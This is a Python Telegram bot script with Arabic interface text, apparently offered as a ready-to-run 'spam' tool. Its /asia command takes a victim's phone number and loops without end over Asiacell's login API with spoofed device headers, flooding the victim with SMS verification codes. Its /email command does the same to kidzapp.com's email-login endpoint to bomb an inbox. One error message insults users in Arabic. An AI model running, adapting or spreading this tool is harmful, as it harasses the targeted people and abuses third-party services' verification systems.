import telebot
import requests, types
from uuid import uuid4
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

token = input(' Enter Your Token Bot : » ')

bot = telebot.TeleBot(token)
print(' اضغط /start')

 
bot.set_my_commands([telebot.types.BotCommand("/start", "بدء البوت"),telebot.types.BotCommand("/email", "اسبام اميل"),telebot.types.BotCommand("/asia", "سبام اسياسيل")])
@bot.message_handler(commands=['start'])
def start(message):
    keyboar = InlineKeyboardMarkup()
    transparent_button = InlineKeyboardButton(text="انضم بقناتي فضلاا", url="https://t.me/uiujq", callback_data="button1")
    keyboar.add(transparent_button)
    t = '''
اهلا بك عزيزي في البوت

طريقه تشغيل البوت هي 

لتشغيل سبام اسيا اضغط /asia

لتشغيل سبام اميل اضغط /email

المطور || @H1HH2

قناة المطور || @VV_P3

'''
    bot.send_message(message.chat.id, t,reply_markup=keyboar)
    
last_message_text = ""

@bot.message_handler(commands=['asia'])
def send_welcome(message):
    keyboardd = InlineKeyboardMarkup()
    transparent_button = InlineKeyboardButton(text="انضم بقناتي فضلاا", url="https://t.me/uiujq", callback_data="button1")
    keyboardd.add(transparent_button)
    
    
    global last_message_text
    last_message_text = ""
    bot.reply_to(message, " حسناا ارسل رقم الهاتف الذي تريد ارسال سبام اليه\n@M02MM",reply_markup=keyboardd)

@bot.message_handler(func=lambda message: True if message.text.isnumeric() else False)
def send_verification_code(message):

    global last_message_text
    number = message.text
    namephone = 'heros'
    while True:
            url = 'https://odpapp.asiacell.com/api/v1/login?lang=ar'
            headers = {
                'X-ODP-API-KEY': str(uuid4()),
                'DeviceID': str(uuid4()),
                'X-OS-Version': '13',
                'X-Device-Type': f'[Android][{namephone}][{namephone}-LX2 13] [TIRAMISU]',
                'X-ODP-APP-VERSION': '3.8.0',
                'X-FROM-APP': 'odp',
                'X-ODP-CHANNEL': 'mobile',
                'X-SCREEN-TYPE': 'MOBILE',
                'Cache-Control': 'private, max-age=240',
                'Content-Type': 'application/json; charset=UTF-8',
                'Content-Length': '43',
                'Host': 'odpapp.asiacell.com',
                'Connection': 'Keep-Alive',
                'Accept-Encoding': 'gzip',
                'User-Agent': 'okhttp/5.0.0-alpha.2',
            }
            data = {"captchaCode": "", "username": number}

            response = requests.post(url, headers=headers, json=data).text

            if 'success' in response:
                bot.reply_to(message, "✅ Done spam")
            else:
                bot.reply_to(message, "💔 Error spam")


@bot.message_handler(commands=['email'])
def send_spam_email(message):
    keyboard = InlineKeyboardMarkup()
    transparent_button = InlineKeyboardButton(text="انضم بقناتي فضلاا", url="https://t.me/uiujq", callback_data="button1")
    keyboard.add(transparent_button)

    
    bot.send_message(message.chat.id, "حسناا ارسل الاميل الذي تريد ارسال سبام اليه \n@M02MM",reply_markup=keyboard)
    
    bot.register_next_step_handler(message, process_email)

def process_email(message):
        email = message.text
    
        try:
            headers = {
        'authority': 'kidzapp.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://kidzapp.com',
        'referer': 'https://kidzapp.com/',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

            data = {
            'email': email,
            }

            while True:
                rr = requests.post('https://kidzapp.com/emailLogin', headers=headers, data=data).json()
                if rr.get('status') == True:
                    bot.send_message(message.chat.id, 'Good Spam : ' + email)
                else:
                    bot.send_message(message.chat.id, 'Error Email : ' + email)
                    return
        except UnboundLocalError:
                bot.send_message(message.chat.id, 'لماذا ترسل الكثير ولم ترسل الاميل لذالك تم حضرك يامطي ياحيوان')


bot.polling()
